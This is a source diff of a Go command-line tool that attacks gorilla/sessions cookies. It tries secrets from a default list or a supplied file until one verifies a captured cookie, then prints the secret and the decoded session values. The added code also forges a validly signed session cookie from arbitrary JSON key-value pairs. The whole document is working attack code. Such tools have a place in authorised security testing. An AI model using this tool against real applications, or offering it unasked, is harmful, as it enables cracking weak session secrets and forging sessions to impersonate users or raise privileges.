@@ -1,65 +1,115 @@
 package main
 
 import (
-        "fmt"
         "flag"
-        "net/http"
+        "log"
+        "fmt"
         "io"
+        "io/ioutil"
         "os"
+        "net/http"
+        "encoding/json"
         "bufio"
         "github.com/gorilla/sessions"
+        "github.com/gorilla/securecookie"
 )
-
-
-func main(){
-        name := flag.String("n", "", "Cookie name is required")
-        secret := flag.String("s", "", "Session store secret is required")
-        sess := flag.String("v", "", "Cookie value is required")
-        dict := flag.String("f", "", "Dict file optional param")
-        flag.Parse()
-
-        if len(*dict) != 0 {
-                file , err := os.Open(*dict)
-                if err != nil {
-                        fmt.Printf("File did not exist %s\n", err)
-                        os.Exit(1)
-                }
-                defer file.Close()
-                reader := bufio.NewReader(file)
-                scanner := bufio.NewScanner(reader)
-                for scanner.Scan() {
-                        default_pws = append(default_pws,scanner.Text())
-                }
+func rebuild_session(file, secret, name *string){
+        var store = sessions.NewCookieStore([]byte(*secret))
+        var reader io.Reader
+        var sessionvalues map[string]string
+        //Get File
+        f, err := os.Open(*file)
+        if err != nil{
+                log.Fatalf("Unable to open file containing key-value pairs: %s\n", err)
         }
+        //Read file contents
+        contents, err := ioutil.ReadAll(f)
+        if err != nil{
+                log.Fatalf("Unable to read file containing key-value pairs: %s\n", err)
+        }
+        //Turn into json object
+        err = json.Unmarshal(contents, &sessionvalues)
+        if err != nil {
+                log.Fatalf("File containing session key-value pairs must be valid json: %s", err)
+        }
+        r, _ := http.NewRequest("", "", reader)
+        session, _ := store.New(r, *name)
+        for i,j := range sessionvalues {
+                session.Values[i] = j
+        }
+        encoded, err := securecookie.EncodeMulti(*name, session.Values,store.Codecs...)
+        fmt.Printf("The Session Value is %s\n", encoded) 
+}
+
+func attack_session(file, secret, name, sess *string){
         if len(*secret) != 0 {
-                default_pws = append(default_pws, *secret)
+                default_pws = []string{*secret}
+        } else {
+                /* Check if a file exists */ 
+                if len(*file) != 0 {
+                        file , err := os.Open(*file)
+                        if err != nil {
+                                fmt.Printf("File did not exist %s\n", err)
+                                os.Exit(1)
+                        }
+                        defer file.Close()
+                        reader := bufio.NewReader(file)
+                        scanner := bufio.NewScanner(reader)
+                        for scanner.Scan() {
+                                default_pws = append(default_pws,scanner.Text())
+                        }
+                }
         }
-        if len(*name)==0 || len(*sess)==0 {
-                fmt.Println("-name and -value and -secret must be set")
-                fmt.Println("Example: ./g2b2 -name=session-name -value=MQT... -secret=something-very-secret -file=")
-                os.Exit(1)
-        }
-
         var reader io.Reader;
-        var c http.Cookie;
-
-        c.Name=*name
-        c.Value=*sess
+        var cookie http.Cookie;
+        cookie.Name  =*name
+        cookie.Value =*sess
 
         for _, j:=range default_pws {
                 store := sessions.NewCookieStore([]byte(j))
                 r, _:=http.NewRequest("", "", reader)
-                r.AddCookie(&c) 
-                _, err := store.Get(r, c.Name)
+                r.AddCookie(&cookie) 
+                session, err := store.Get(r, cookie.Name)
                 if err != nil {
-                        fmt.Printf("Secret not %s\n", j)
                         continue
                 }
-                fmt.Println("SESSION FOUND:")
                 fmt.Printf("The secret is '%s'\n", j)
+                for i, j := range session.Values {
+                        fmt.Printf("\tKey %s -> Value %s\n", i, j)
+                }
                 os.Exit(0)
         }
+        log.Fatalf("Session Secret Not Found\n")
+}
+func main(){
+        name := flag.String("n", "", "The name of the cookie when constructing or attacking.")
+        secret := flag.String("s", "", "Specify a secret to attack, or user a particular secret when reconstructing")
+        sess := flag.String("v", "", "The value of the session string that will be attacked")
+        file := flag.String("f", "", "Json Encoded file containing key value pairs of the session when Reconstructing. File is supplementary list of passwords when attacking.")
+        rebuild := flag.Bool("r", false, "True if you are reconstructing the session")
+        flag.Parse()
         
+        if len(*name) == 0 {
+                log.Fatalf("Name must be set to attack or reconstruct a session.\n")
+        }  
+
+        if *rebuild {
+                if len(*file) == 0 {
+                        log.Fatalf("JSON File must be set to read key-value pairs into your new session.\n")
+                }
+                if len(*secret) == 0 {
+                        log.Fatalf("Secret password is required to reconstruct a session.\n")
+                }
+                if len(*name) == 0 {
+                        log.Fatalf("Name of the cookie you are creating must be set.\n")
+                }
+                rebuild_session(file, secret, name)
+        } else {
+                if len(*sess) == 0 {
+                        log.Fatalf("Session value required to attack the session.\n")
+                }  
+                attack_session(file, secret, name, sess)
+        }
 }
 
 /*
